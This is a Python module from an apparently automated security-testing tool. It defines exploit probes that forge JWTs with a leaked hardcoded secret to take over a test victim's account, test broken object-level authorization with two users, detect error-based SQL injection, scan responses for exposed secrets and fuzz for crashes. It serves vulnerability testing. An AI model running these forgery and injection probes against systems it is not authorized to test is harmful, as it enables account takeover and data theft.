"""
execution/probes.py — Active exploit probes
============================================
QAX's runner could only send HTTP requests and click UI. Some bugs need MORE than
that to prove — forging a token with a leaked secret, or crashing an endpoint with
oversized input. Probes are that broader execution vocabulary: each actively tries
an exploit and returns hard evidence when it works.

The crown jewel is forge_jwt: it signs a JWT with the secret the AppModel found
hardcoded in config and uses it to impersonate a freshly-registered victim — the
critical bug QAX was structurally unable to reach. Signing is pure stdlib HMAC (no
new dependency), covering the symmetric HS256/384/512 algorithms a hardcoded secret
implies.

All probes are best-effort and never raise to the caller.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
import time
import uuid

import requests

from services.results import ProbeFinding

logger = logging.getLogger(__name__)

_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def _b64(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def sign_jwt_hs(secret: str, algorithm: str, claims: dict) -> str | None:
    """Sign a JWT with an HMAC (symmetric) algorithm using only the stdlib."""
    hasher = _HASHES.get((algorithm or "HS256").upper())
    if hasher is None:
        return None
    header = _b64(json.dumps({"alg": algorithm.upper(), "typ": "JWT"},
                             separators=(",", ":")).encode())
    payload = _b64(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = header + b"." + payload
    sig = _b64(hmac.new(secret.encode(), signing_input, hasher).digest())
    return (signing_input + b"." + sig).decode()


def _jwt_algorithm(model) -> str:
    """Read the JWT algorithm from the model's config, defaulting to HS256."""
    for c in getattr(model, "config", []):
        if isinstance(c, dict) and "algorithm" in str(c.get("key", "")).lower():
            return str(c.get("default") or "HS256")
    return "HS256"


def forge_jwt_probe(model, base_url: str, *, session: requests.Session | None = None) -> ProbeFinding | None:
    """
    Try to forge a JWT with the hardcoded secret and impersonate a victim.

    Returns a ProbeFinding (exploited=True on success), or None when there is no
    hardcoded secret to forge with.
    """
    sess = session or requests.Session()

    secret = None
    for s in getattr(model, "exposed_secrets", []):
        if any(k in str(s.get("key", "")).lower() for k in ("jwt", "secret", "sign", "token", "key")):
            secret = s.get("default")
            break
    if not secret:
        return None

    algorithm = _jwt_algorithm(model)
    if not algorithm.upper().startswith("HS"):
        return ProbeFinding(probe="forge-jwt", title="JWT uses an asymmetric algorithm",
                            exploited=False, severity="P1",
                            evidence=f"algorithm {algorithm} — a config secret is not the signing key",
                            target="auth")

    from core.auth_recipe import derive_auth_recipe, register_body, subject_candidates
    recipe = derive_auth_recipe(model)
    register = recipe["register_path"]
    identity = recipe["identity_path"]
    base = base_url.rstrip("/")
    victim = f"victim_{uuid.uuid4().hex[:8]}@example.com"

    reg_response = None
    try:
        rr = sess.post(f"{base}{register}",
                       json=register_body(recipe, model, victim, password="Str0ngPass!23"),
                       timeout=15)
        try:
            reg_response = rr.json()
        except Exception:
            reg_response = None
    except Exception as exc:  # pragma: no cover - network
        logger.warning("forge_jwt: victim register failed: %s", exc)

    exp = int(time.time()) + 3600
    for sub in subject_candidates(victim, reg_response):
        token = sign_jwt_hs(secret, algorithm, {"sub": sub, "exp": exp})
        if not token:
            continue
        try:
            r = sess.get(f"{base}{identity}", headers={"Authorization": f"Bearer {token}"}, timeout=15)
        except Exception as exc:  # pragma: no cover - network
            logger.warning("forge_jwt: identity call failed: %s", exc)
            continue
        if r.status_code == 200 and victim in r.text:
            return ProbeFinding(
                probe="forge-jwt",
                title="JWT forgery → full account takeover",
                exploited=True, severity="P1",
                evidence=(f"Forged a token for {victim} with the hardcoded secret "
                          f"{str(secret)[:24]!r} (alg {algorithm}); GET {identity} returned 200 with "
                          f"the victim's data — no password needed."),
                target=identity)

    return ProbeFinding(probe="forge-jwt", title="JWT forgery attempt did not succeed",
                        exploited=False, severity="P1",
                        evidence="forged token was rejected (secret/subject/alg did not match)",
                        target=identity)


_SQL_ERRORS = ("sql syntax", "sqlite3", "operationalerror", "sqlalchemy",
               "unrecognized token", "syntax error", "psycopg2", "you have an error in your sql",
               "unterminated", "near \"", "programmingerror")


_ID_KW = ("email", "username", "login", "phone", "mobile", "msisdn", "user")
_SECRET_KW = ("password", "passwd", "pwd", "secret", "pin", "pass")


def _auth_token(sess, base, recipe, model, identity, password="Secret123!"):
    """
    Register `identity` then log in and return a bearer token (or None).

    The login body is built from the LOGIN endpoint's OWN request fields — not the
    register id field — because an app can register with one identifier (email) and
    log in with another (username). The value reused is whatever the register body
    put in that same field, so the two always match.
    """
    from core.auth_recipe import field_names, register_body
    reg_body = register_body(recipe, model, identity, password=password)
    try:
        sess.post(f"{base}{recipe['register_path']}", json=reg_body, timeout=15)
    except Exception:
        return None

    login_fields: list[str] = []
    for e in getattr(model, "endpoints", []):
        if (isinstance(e, dict) and str(e.get("path", "")) == recipe["login_path"]
                and str(e.get("method", "")).upper() == "POST"):
            login_fields = field_names(e.get("request_fields"))
            break
    id_field = next((f for f in login_fields if any(k in f.lower() for k in _ID_KW)), recipe["id_field"])
    sec_field = next((f for f in login_fields if any(k in f.lower() for k in _SECRET_KW)), recipe["secret_field"])
    id_value = reg_body.get(id_field, identity)

    try:
        lr = sess.post(f"{base}{recipe['login_path']}",
                       json={id_field: id_value, sec_field: password}, timeout=15)
        data = lr.json() if lr.status_code < 400 else {}
    except Exception:
        return None
    if isinstance(data, dict):
        tok = data.get(recipe["token_field"])
        if tok:
            return tok
        for k, v in data.items():
            if isinstance(v, str) and any(t in k.lower() for t in ("token", "jwt", "access", "auth")):
                return v
    return None


def bola_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Broken Object-Level Authorization via a TWO-USER control experiment.

    User A creates an object carrying a unique secret marker; user B then reads it
    by its key. If B's read returns 2xx WITH A's marker, there is no ownership check
    — B read A's private object. A reading its own object first is the control that
    proves the object and endpoint are valid (so a failure to create isn't misread).
    When the app is safe, B gets a 404 and nothing is flagged.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]

    # Pair each auth-required "read by key" GET with the POST that creates into the
    # same collection, and find which body field is the object's key.
    pairs = []
    for ge in eps:
        if str(ge.get("method", "")).upper() != "GET" or not ge.get("auth_required"):
            continue
        gp = str(ge.get("path", ""))
        m = re.search(r"\{([^}]+)\}", gp)
        if not m:
            continue
        param = m.group(1)
        prefix = gp[:m.start()].rstrip("/")
        post = next((e for e in eps if str(e.get("method", "")).upper() == "POST"
                     and str(e.get("path", "")).rstrip("/") == prefix
                     and field_names(e.get("request_fields"))), None)
        if not post:
            continue
        pf = field_names(post.get("request_fields"))
        key_field = next((f for f in pf if f.lower() == param.lower()), None) \
            or next((f for f in pf if any(k in f.lower() for k in ("title", "name", "id", "slug", "key"))), None)
        if key_field:
            pairs.append((post, ge, prefix, param, key_field, pf))
    if not pairs:
        return out

    ta = _auth_token(sess, base, recipe, model, f"bola_a_{uuid.uuid4().hex[:8]}@example.com")
    tb = _auth_token(sess, base, recipe, model, f"bola_b_{uuid.uuid4().hex[:8]}@example.com")
    if not ta or not tb:
        return out

    _CONTENT_KW = ("secret", "content", "body", "data", "value", "text", "note", "description", "payload")
    for post, ge, prefix, param, key_field, pf in pairs[:4]:
        key = f"qaxbola{uuid.uuid4().hex[:10]}"
        marker = f"qaxmarker{uuid.uuid4().hex[:12]}"
        body: dict = {}
        for f in pf:
            lf = f.lower()
            if f == key_field:
                body[f] = key
            elif any(k in lf for k in _CONTENT_KW):
                body[f] = marker
            elif any(k in lf for k in _SECRET_KW):
                body[f] = "Secret123!"
            elif any(k in lf for k in ("age", "count", "number", "qty")):
                body[f] = 1
            else:
                body[f] = "test"
        if marker not in str(body):  # make sure a detectable secret is present
            placed = next((f for f in pf if f != key_field), None)
            if not placed:
                continue  # key-only resource: nothing private to leak, can't prove
            body[placed] = marker

        auth_a = {"Authorization": f"Bearer {ta}"}
        auth_b = {"Authorization": f"Bearer {tb}"}
        try:
            cr = sess.post(f"{base}{prefix}", json=body, headers=auth_a, timeout=15)
            if cr.status_code >= 400:
                continue
            read_path = f"{base}{str(ge['path']).replace('{' + param + '}', key)}"
            ar = sess.get(read_path, headers=auth_a, timeout=15)
            if ar.status_code >= 400:  # control: A must be able to read its own object
                continue
            br = sess.get(read_path, headers=auth_b, timeout=15)
        except Exception:
            continue
        if br.status_code < 300 and marker in (br.text or ""):
            out.append(ProbeFinding(
                probe="bola", title=f"Broken object-level authorization in GET {ge['path']}",
                exploited=True, severity="P1",
                evidence=(f"User B read user A's object (key '{key}') via {ge['path']}: B's request "
                          f"returned {br.status_code} containing A's private content. The endpoint "
                          f"has no ownership check — any authenticated user can read any object."),
                target=str(ge["path"])))
    return out


def sqli_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Error-based SQL injection with a CONTROL: a benign value vs the same value with
    a single quote. If the quote breaks the query (5xx or a SQL error in the body)
    while the benign value is fine, the input reaches a raw query — injection.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    cands = [e for e in getattr(model, "endpoints", [])
             if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
             and "{" in str(e.get("path", ""))]
    token = None
    if any(e.get("auth_required") for e in cands):
        token = _auth_token(sess, base, recipe, model, f"sqli_{uuid.uuid4().hex[:8]}@example.com")

    for e in cands[:5]:
        path = str(e.get("path", ""))
        m = re.search(r"\{([^}]+)\}", path)
        if not m:
            continue
        param = m.group(1)
        headers = {"Authorization": f"Bearer {token}"} if (e.get("auth_required") and token) else {}
        benign = "qaxprobe1"
        quote = "qaxprobe1'"
        try:
            rb = sess.get(f"{base}{path.replace('{' + param + '}', benign)}", headers=headers, timeout=15)
            rq = sess.get(f"{base}{path.replace('{' + param + '}', quote)}", headers=headers, timeout=15)
        except Exception:
            continue
        body = (rq.text or "").lower()
        sql_err = any(s in body for s in _SQL_ERRORS)
        if rb.status_code >= 500:
            continue  # benign value already 5xx — endpoint is just broken, not a clean signal
        if sql_err:
            # SQL error text on the quote = the input reached a raw query. High confidence.
            out.append(ProbeFinding(
                probe="sqli", title=f"SQL injection in {e.get('method')} {path} ('{param}')",
                exploited=True, severity="P1",
                evidence=(f"A single quote in '{param}' produced a SQL error (benign → "
                          f"{rb.status_code}, quote → {rq.status_code}). The input reaches a raw, "
                          f"unparameterized query."),
                target=path))
        elif rq.status_code >= 500:
            # A 5xx with NO SQL error text is usually input-handling failure, not injection.
            # Field rule: a 500 without SQL error text is not proof of SQLi — don't cry wolf.
            out.append(ProbeFinding(
                probe="input-robustness",
                title=f"Unhandled 500 on injection-style input in {e.get('method')} {path} ('{param}')",
                exploited=True, severity="P3",
                evidence=(f"A single quote in '{param}' caused HTTP {rq.status_code} (benign → "
                          f"{rb.status_code}) with NO SQL error text. Likely input-validation/robustness, "
                          f"NOT confirmed SQL injection — reported low and separately."),
                target=path))
    return out


# Field names that must NEVER appear in a response body — a credential or secret
# in output is an exposure regardless of auth. Token-family names are deliberately
# excluded: a login returning an access_token is the expected, correct behaviour.
_SENSITIVE_OUT = ("password", "passwd", "pwd", "secret", "private_key", "privatekey",
                  "ssn", "social_security", "credit_card", "creditcard", "card_number",
                  "cardnumber", "cvv", "cvc", "salt", "password_hash", "pwd_hash")


def _sensitive_keys(data, found: set | None = None) -> set:
    """Recursively collect response keys that name a credential/secret with a value."""
    found = found if found is not None else set()
    if isinstance(data, dict):
        for k, v in data.items():
            kl = str(k).lower()
            if any(s in kl for s in _SENSITIVE_OUT) and v not in (None, "", [], {}):
                found.add(str(k))
            _sensitive_keys(v, found)
    elif isinstance(data, list):
        for item in data:
            _sensitive_keys(item, found)
    return found


def excessive_data_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Excessive Data Exposure: fetch each GET endpoint and inspect the LIVE response
    body (not the spec — nested secrets don't show as top-level fields) for keys
    that should never be returned. A credential in output, especially on an
    unauthenticated endpoint, is the finding. Deterministic, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    gets = [e for e in getattr(model, "endpoints", [])
            if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"]
    token = None
    seen: set = set()
    for e in gets[:12]:
        path = str(e.get("path", ""))
        resolved = re.sub(r"\{[^}]+\}", "qaxprobe1", path)
        if resolved in seen:
            continue
        seen.add(resolved)
        headers = {}
        if e.get("auth_required"):
            if token is None:
                token = _auth_token(sess, base, recipe, model, f"ede_{uuid.uuid4().hex[:8]}@example.com")
            if not token:
                continue
            headers = {"Authorization": f"Bearer {token}"}
        try:
            r = sess.get(f"{base}{resolved}", headers=headers, timeout=15)
            if r.status_code >= 400:
                continue
            data = r.json()
        except Exception:
            continue
        hits = _sensitive_keys(data)
        if hits:
            public = not e.get("auth_required")
            out.append(ProbeFinding(
                probe="excessive-data",
                title=f"Excessive data exposure in GET {path}",
                exploited=True, severity="P1" if public else "P2",
                evidence=(f"The response exposes sensitive field(s) {sorted(hits)} "
                          + ("with NO authentication required" if public
                             else "to any authenticated user")
                          + f" (HTTP {r.status_code}). Credentials/secrets must never be returned."),
                target=path))
    return out


def crash_fuzz_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """Send oversized inputs to auth endpoints and flag any 5xx (unhandled crash)."""
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, register_body
    recipe = derive_auth_recipe(model)
    register = recipe["register_path"]
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    # 100 chars: over bcrypt's 72-byte limit but within a typical 128 schema max,
    # so validation accepts it and the crash surfaces at the hashing step.
    big_password = "A" * 100
    try:
        r = sess.post(f"{base}{register}",
                      json=register_body(recipe, model, f"fuzz_{uuid.uuid4().hex[:8]}@example.com",
                                         password=big_password),
                      timeout=15)
        if r.status_code >= 500:
            out.append(ProbeFinding(
                probe="crash-fuzz", title="Server error (5xx) on oversized password",
                exploited=True, severity="P2",
                evidence=f"POST {register} with a {len(big_password)}-char password → HTTP "
                         f"{r.status_code} (valid per the schema's max length; exceeds the hashing "
                         f"library's 72-byte limit)",
                target=register))
    except Exception as exc:  # pragma: no cover - network
        logger.warning("crash_fuzz failed: %s", exc)
    return out
